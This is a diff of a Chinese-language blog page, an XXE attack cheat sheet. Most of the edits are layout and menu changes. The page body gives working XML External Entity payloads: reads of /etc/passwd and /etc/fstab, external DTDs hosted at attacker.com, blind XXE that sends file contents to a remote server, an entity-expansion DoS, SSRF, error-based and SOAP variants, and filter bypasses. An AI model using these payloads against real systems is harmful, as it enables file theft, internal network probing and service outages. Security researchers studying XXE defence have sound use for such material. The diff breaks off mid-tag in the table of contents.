@@ -20,7 +20,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="XXE payloads and attack methods.">
@@ -33,8 +33,8 @@
 <meta property="article:published_time" content="2022-05-04T09:01:54.000Z">
 <meta property="article:modified_time" content="2022-05-04T09:01:54.000Z">
 <meta property="article:author" content="Srpopty">
-<meta property="article:tag" content="CheatSheet">
 <meta property="article:tag" content="Web">
+<meta property="article:tag" content="XXE">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://srpopty.github.io/2022/05/04/XXE-CheatSheet/">
@@ -111,6 +111,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -122,6 +123,26 @@
         <li class="menu-item menu-item-home">
 
     <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-knowledge">
+
+    <a href="/knowledge/" rel="section"><i class="fa fa-fw fa-book"></i>知识库</a>
+
+  </li>
+        <li class="menu-item menu-item-life">
+
+    <a href="/life/" rel="section"><i class="fa fa-fw fa-rocket"></i>随想</a>
+
+  </li>
+        <li class="menu-item menu-item-ctf">
+
+    <a href="/ctf/" rel="section"><i class="fa fa-fw fa-flag"></i>ctf</a>
+
+  </li>
+        <li class="menu-item menu-item-vulnerabilities">
+
+    <a href="/vulnerabilities/" rel="section"><i class="fa fa-fw fa-eye"></i>漏洞</a>
 
   </li>
         <li class="menu-item menu-item-tags">
@@ -139,9 +160,44 @@
     <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
 
   </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 
 </nav>
+  <div class="site-search">
+    <div class="search-pop-overlay">
+  <div class="popup search-popup">
+      <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+  </div>
+</div>
+
+  </div>
 </div>
     </header>
 
@@ -197,7 +253,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hack/" itemprop="url" rel="index"><span itemprop="name">Hack</span></a>
+                  <a href="/categories/CheatSheet/" itemprop="url" rel="index"><span itemprop="name">CheatSheet</span></a>
                 </span>
             </span>
 
@@ -213,8 +269,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><hr>
-<h2 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h2><p>XXE (XML External Entity, XML 外部实体)，在一个 XML 文档中，攻击者可以直接控制 DTD 中 XML 实体的定义，引用外部实体，导致 SSRF。</p>
+        <h1 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h1><p>XXE (XML External Entity, XML 外部实体)，在一个 XML 文档中，攻击者可以直接控制 DTD 中 XML 实体的定义，引用外部实体，导致 SSRF。</p>
 <p>使用 XML 的地方有：</p>
 <ul>
 <li>文档格式 OOXML, ODF, PDF, RSS, DOCX…</li>
@@ -232,7 +287,7 @@
 <p>在某些 xml 解析器中，尽管禁用了外部实体，但是解析器会在 DTD 定义阶段就对 URL 进行请求，但是不会展开该实体。<br>libxml2.9.0 后默认不解析外部实体。<br>simplexml_load_file 旧版本默认解析外部实体，新版本要指定第三個参数 LIBXML_NOENT</p>
 </blockquote>
 <p>XXE 有以下几种利用方法（以文件读取为例）。</p>
-<h3 id="普通实体"><a href="# 普通实体" class="headerlink" title="普通实体"></a>普通实体 </h3><p> 引用外部普通实体。</p>
+<h2 id="普通实体"><a href="# 普通实体" class="headerlink" title="普通实体"></a>普通实体 </h2><p> 引用外部普通实体。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <blockquote>
@@ -241,7 +296,7 @@
 <p>当要读取的文件中存在一些复杂的字符（例如 <code>/etc/fstab</code>），可能会引起 xml 解析器报错时，可以使用参数实体拼接绕过，如下所示。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA [&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/fstab&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">all</span> <span class="string">&quot;% start;% goodies;% end;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="参数实体外部 -DTD"><a href="# 参数实体外部 -DTD" class="headerlink" title="参数实体外部 DTD"></a>参数实体外部 DTD</h3><p>利用参数实体引用外部 DTD 文件。</p>
+<h2 id="参数实体外部 -DTD"><a href="# 参数实体外部 -DTD" class="headerlink" title="参数实体外部 DTD"></a>参数实体外部 DTD</h2><p>利用参数实体引用外部 DTD 文件。</p>
 <blockquote>
 <p>注意：参数实体只能在 DTD 中引用，不能在声明前引用，也不能在实体声明内部引用。</p>
 </blockquote>
@@ -250,20 +305,20 @@
 <p>其中 <code>evil.dtd</code> 的内容如下。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="普通实体外部 -DTD"><a href="# 普通实体外部 -DTD" class="headerlink" title="普通实体外部 DTD"></a>普通实体外部 DTD</h3><p>通过普通实体引用外部 DTD 文件。</p>
+<h2 id="普通实体外部 -DTD"><a href="# 普通实体外部 -DTD" class="headerlink" title="普通实体外部 DTD"></a>普通实体外部 DTD</h2><p>通过普通实体引用外部 DTD 文件。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>其中 <code>evil.dtd</code> 的内容如下。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><p>通过定义数量巨大的实体可以造成 DOS 攻击。</p>
+<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>通过定义数量巨大的实体可以造成 DOS 攻击。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;a2;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>a2 会被扩展为很多 a1，每个 a1 又会被扩展为很多 a0，这样的嵌套扩展会严重拖慢 XML 解析器的速度。</p>
-<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>外部实体引用可以访问一个 URL，造成 SSRF，通过 SSRF 可以读取文件，攻击内网等。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>外部实体引用可以访问一个 URL，造成 SSRF，通过 SSRF 可以读取文件，攻击内网等。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;http://a.com/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="XXE- 盲注"><a href="#XXE- 盲注" class="headerlink" title="XXE 盲注"></a>XXE 盲注 </h3><p> 无回显的情况下可以将数据通过 HTTP 发送到远程服务器。</p>
+<h2 id="XXE- 盲注"><a href="#XXE- 盲注" class="headerlink" title="XXE 盲注"></a>XXE 盲注 </h2><p> 无回显的情况下可以将数据通过 HTTP 发送到远程服务器。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">    % send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>其中 <code>evil.dtd</code> 的内容如下。</p>
@@ -283,7 +338,7 @@
 <blockquote>
 <p>在 PHP 环境下可以将数据通过 base64 编码（利用 filter）通过 url 发送到远程服务器以避免 url 坏字符。</p>
 </blockquote>
-<h3 id="报错注入"><a href="# 报错注入" class="headerlink" title="报错注入"></a>报错注入 </h3><p> 类似 SQL 注入的报错注入，XXE 也可以通过报错注入返回一些额外信息，如下所示。</p>
+<h2 id="报错注入"><a href="# 报错注入" class="headerlink" title="报错注入"></a>报错注入 </h2><p> 类似 SQL 注入的报错注入，XXE 也可以通过报错注入返回一些额外信息，如下所示。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">NUMBER</span> <span class="string">&#x27;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % NUMBER;</span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>以下 Payload 可能也会引起 XML 解析器错误：</p>
@@ -296,9 +351,9 @@
 <li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;http% pay;:/127.0.0.1/&#39;&gt;&quot;&gt; % trick; % err;</code></li>
 <li><code>&lt;!DOCTYPE html [&lt;!ENTITY % foo SYSTEM&quot;file:///c:/boot.ini&quot;&gt; % foo;]&gt;</code></li>
 </ul>
-<h3 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        &lt;![CDATA [&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; % dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        &lt;![CDATA [&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; % dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="其他 -Payload"><a href="# 其他 -Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h3><h2 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过</h2><ul>
+<h1 id="其他 -Payload"><a href="# 其他 -Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h1><h2 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过</h2><ul>
 <li>可以用 <code>PUBLIC</code> 代替 <code>SYSTEM</code>，二者完全等价。</li>
 <li>修改文档编码格式，例如 <code>UTF-7</code>，<code>UTF-16</code> 等。</li>
 </ul>
@@ -469,8 +524,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/CheatSheet/" rel="tag"># CheatSheet</a>
               <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/XXE/" rel="tag"># XXE</a>
           </div>
 
         
@@ -546,7 +601,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-number">1.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.1.</span> <span class="nav-text">普通实体 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%A4%96%E9%83%A8%20-DTD"><span class="nav-number">1.1.2.</span> <span class="nav-text">参数实体外部 DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93%E5%A4%96%E9%83%A8%20-DTD"><span class="nav-number">1.1.3.</span> <span class="nav-text">普通实体外部 DTD</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload"><span class="nav-number">1.2.</span> <span class="nav-text">Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOS"><span class="nav-number">1.2.1.</span> <span class="nav-text">DOS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">1.2.2.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-%20%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.3.</span> <span class="nav-text">XXE 盲注 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.4.</span> <span class="nav-text">报错注入 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOAP"><span class="nav-number">1.2.5.</span> <span class="nav-text">SOAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%20-Payload"><span class="nav-number">1.2.6.</span> <span class="nav-text">其他 Payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">XML 注入 </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XPath-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.</span> <span class="nav-text">XPath 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.1.</span> <span class="nav-text">盲注 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.1.1.</span> <span class="nav-text"> 布尔盲注 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%20%E5%A4%96%E5%B8%A6"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">HTTP 外带 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-%20%E5%A4%96%E5%B8%A6"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">DNS 外带 </span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.5.2.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XPath-%20%E8%AF%AD%E6%B3%95%E9%80%9F%E6%9F%A5"><span class="nav-number">1.5.3.</span> <span class="nav-text">XPath 语法速查 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8A%82%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">节点类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%AE%9A%E8%AF%AD"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">限定语 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">通配符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%9A%E8%B7%AF%E5%BE%84%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.5.3.5.</span> <span class="nav-text">多路径查询</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XQuery-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">XQuery 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSD-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.7.</span> <span class="nav-text">XSD 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-schemaLocation"><span class="nav-number">1.7.1.</span> <span class="nav-text">XSD schemaLocation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-noNamespaceSchemaLocation"><span class="nav-number">1.7.2.</span> <span class="nav-text">XSD noNamespaceSchemaLocation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-Include-import"><span class="nav-number">1.7.3.</span> <span class="nav-text">XSD Include&#x2F;import</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XInclude"><span class="nav-number">1.7.4.</span> <span class="nav-text">XInclude</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-%20%E6%8A%A5%E9%94%99"><span class="nav-number">1.7.5.</span> <span class="nav-text">XSD 报错</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSLT-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.8.</span> <span class="nav-text">XSLT 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%20-XSLT-%20%E4%BF%A1%E6%81%AF"><span class="nav-number">1.8.1.</span> <span class="nav-text">获取 XSLT 信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-Stylesheet"><span class="nav-number">1.8.2.</span> <span class="nav-text">XSLT Stylesheet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-Include-import"><span class="nav-number">1.8.3.</span> <span class="nav-text">XSLT Include&#x2F;import</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.8.4.</span> <span class="nav-text">XSLT 读取文件 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-RCE"><span class="nav-number">1.8.5.</span> <span class="nav-text">XSLT RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.8.6.</span> <span 